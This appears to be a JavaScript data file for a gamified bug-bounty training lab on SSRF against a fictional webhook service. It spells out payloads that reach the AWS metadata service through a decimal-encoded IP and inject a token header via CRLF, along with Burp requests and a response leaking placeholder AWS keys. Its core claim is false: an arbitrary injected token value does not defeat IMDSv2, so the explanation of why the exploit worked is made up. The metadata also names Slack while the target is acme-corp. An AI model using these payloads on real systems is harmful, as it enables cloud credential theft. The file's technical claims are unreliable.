// ==========================================================
// SCENARIO 005: SSRF IMDSv2 BYPASS (EXPERT) - V2 DATA
// ==========================================================

window.scenario_005 = {
  metadata: {
    id: "scenario-005",
    title: "SSRF IMDSv2 Bypass with CRLF Injection",
    level: "Expert",
    category: "Cloud",
    company: "Slack",
    reward: "$12,000",
    time: "3+ Hours"
  },

  decisionLog: [
    {
      hypothesis: "Internal IP filters can be bypassed using DNS Rebinding.",
      whyFailed: "DNS Rebinding failed because the target application caches resolved IP records locally.",
      planB: "Try decimal encoding (2852039166) to bypass IP filters and use CRLF injection in secondary parameters to bypass IMDSv2.",
      ignored: "Brute-forcing external metadata URLs or API endpoints."
    }
  ],

  payloads: [
    {
      code: "url=http://2852039166/latest/meta-data/&name=Test%0d%0aX-aws-ec2-metadata-token: bypass",
      explanation: "Decimal IP conversion combined with Carriage Return Line Feed (CRLF) header injection.",
      whyWorked: "IP regex filter ignores decimal notation. The CRLF injection in the 'name' parameter appends the required token header to the outgoing socket.",
      alternatives: ["DNS rebinding bypass", "Octal IP conversion"]
    }
  ],

  mistakes: [
    {
      mistake: "Querying localhost directly using raw string '127.0.0.1'.",
      whyWrong: "Blacklist regex filters detect and drop standard local IP representations immediately.",
      betterWay: "Use alternative formats (decimal/hex) or setup external redirects."
    }
  ],

  steps: [
    {
      name: "Mission Brief",
      time: "09:00",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: webhook.acme-corp.com
Audit Acme Corp's webhook notifier. Verify if it is vulnerable to Server-Side Request Forgery (SSRF) and bypass WAF filters.

Click **Next Step** to scan routes.
      `,
      aiAdvisor: {
        hint: "No actions needed. Proceed to next step.",
        payloadExplanation: "No payload needed.",
        failureExplanation: "None."
      }
    },
    {
      name: "Passive Recon",
      time: "09:15",
      workspace: "recon",
      xpReward: 150,
      description: `
### Scraping webhooks routes
Discover webhook submission endpoints.
      `,
      terminalCommands: [
        {
          name: "katana -u https://webhook.acme-corp.com/ -silent",
          correct: true,
          evidence: {
            title: "Webhook API Endpoint",
            content: "POST /api/v1/notifications/send\nParams: url, name"
          },
          output: [
            { text: "[INF] Crawling routing tables...", type: "info" },
            { text: "https://webhook.acme-corp.com/api/v1/notifications/send", type: "out" },
            { text: "https://webhook.acme-corp.com/api/v1/notifications/status", type: "out" },
            { text: "[INF] Crawler complete.", type: "success" }
          ]
        }
      ],
      aiAdvisor: {
        hint: "Run the katana tool.",
        payloadExplanation: "Katana scans endpoints.",
        failureExplanation: "Missing backend routes."
      }
    },
    {
      name: "DNS Verification",
      time: "09:40",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Bypassing IP Blacklists
Querying local IPs throws blacklists errors. How do we bypass this?
      `,
      choices: [
        {
          text: "A) Try localhost decimal conversion: http://2130706433",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "Bypasses check, but localhost has no metadata services. Refused."
        },
        {
          text: "B) Use decimal encoding: http://2852039166/latest/meta-data/",
          correct: true,
          xp: 50,
          outcome: "Bypasses check! Server attempts to connect but times out due to IMDSv2 protection."
        }
      ],
      aiAdvisor: {
        hint: "Select option B to convert AWS metadata IP to decimal.",
        payloadExplanation: "Decimal conversions bypass blacklist regex filters.",
        failureExplanation: "Localhost has no cloud metadata console."
      }
    },
    {
      name: "Investigation Mode",
      time: "10:05",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Header Injection Bypass
AWS IMDSv2 requires a session token header (\`X-aws-ec2-metadata-token\`). Since we can only trigger GET requests, how do we insert the token header?
      `,
      choices: [
        {
          text: "A) Try DNS rebinding to dump tokens",
          correct: false,
          xp: -10,
          timePenalty: 15,
          outcome: "Failed. Target resolved IP caching is enabled."
        },
        {
          text: "B) Perform CRLF injection in the 'name' parameter",
          correct: true,
          xp: 50,
          outcome: "CRLF injection allows inserting custom headers into socket."
        }
      ],
      aiAdvisor: {
        hint: "Select option B for CRLF header injection.",
        payloadExplanation: "Newline characters split socket requests.",
        failureExplanation: "DNS rebinding is blocked by resolver caches."
      }
    },
    {
      name: "Burp Verification",
      time: "10:30",
      workspace: "burp",
      xpReward: 200,
      description: `
### Tampering Request parameters
Inject the CRLF sequence into the \`name\` field in Burp Repeater.
      `,
      burpRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=Default",
      burpResponse: "HTTP/1.1 400 Bad Request\n\nError: Connection to metadata server timed out.",
      burpActions: [
        {
          name: "Inject CRLF token header",
          correct: true,
          modifiedRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=Test%0d%0aX-aws-ec2-metadata-token: BYPASS",
          modifiedResponse: "HTTP/1.1 200 OK\n\n{\n  \"AccessKeyId\": \"ASIAXYZ12345\",\n  \"Token\": \"FLAG{aws_imds_metadata_compromised_via_crlf}\"\n}",
          evidence: {
            title: "AWS Credentials Exfiltration logs",
            content: "AccessKeyId: ASIAXYZ12345\nToken: FLAG{aws_imds_metadata_compromised_via_crlf}"
          }
        }
      ],
      aiAdvisor: {
        hint: "Click Inject CRLF token header button.",
        payloadExplanation: "CRLF sequence writes custom header tokens.",
        failureExplanation: "Unmodified header triggers connection timeouts."
      }
    },
    {
      name: "Exploitation & Flag",
      time: "11:00",
      workspace: "lab",
      xpReward: 300,
      instructions: "Perform exfiltration via CRLF injection and enter the captured flag.",
      targetUrl: "https://webhook.acme-corp.com/api/v1/notifications/send",
      correctFlag: "FLAG{aws_imds_metadata_compromised_via_crlf}",
      aiAdvisor: {
        hint: "Flag: FLAG{aws_imds_metadata_compromised_via_crlf}",
        payloadExplanation: "Flag from AWS metadata keys.",
        failureExplanation: "Flag mismatch."
      }
    },
    {
      name: "Report Writing",
      time: "11:30",
      workspace: "report",
      xpReward: 250,
      aiAdvisor: {
        hint: "Keywords: 'ssrf', 'crlf'.",
        payloadExplanation: "Explain SSRF chained with CRLF.",
        failureExplanation: "Details missing."
      }
    },
    {
      name: "Triage & Verdict",
      time: "14 Days Later",
      workspace: "review",
      aiAdvisor: {
        hint: "Review triage feedback.",
        payloadExplanation: "Triage logs.",
        failureExplanation: "None."
      }
    },
    {
      name: "Lessons Learned",
      time: "Post-Incident",
      workspace: "quiz",
      quizData: [
        {
          question: "How does CRLF Injection help in SSRF?",
          options: [
            "Alters database schema.",
            "Allows injecting custom headers into socket requests."
          ],
          answer: 1
        }
      ],
      aiAdvisor: {
        hint: "Select option B.",
        payloadExplanation: "CRLF injection logic.",
        failureExplanation: "XP penalty."
      }
    }
  ],

  realReport: {
    title: "SSRF bypasses filters and leverages CRLF to dump AWS IMDSv2 Credentials",
    severity: "Critical",
    type: "SSRF",
    desc: "Vulnerability in notification sender allowing SSRF via decimal bypass (2852039166) and CRLF in name parameter to inject session tokens.",
    steps: "1. POST /api/v1/notifications/send.\n2. Set url to http://2852039166/...\n3. Inject CRLF header in name parameter.",
    impact: "Full cloud account credentials exfiltration.",
    feedback: "High risk bypass corrected. Bounty awarded.",
    keywords: ["ssrf", "crlf"]
  }
};
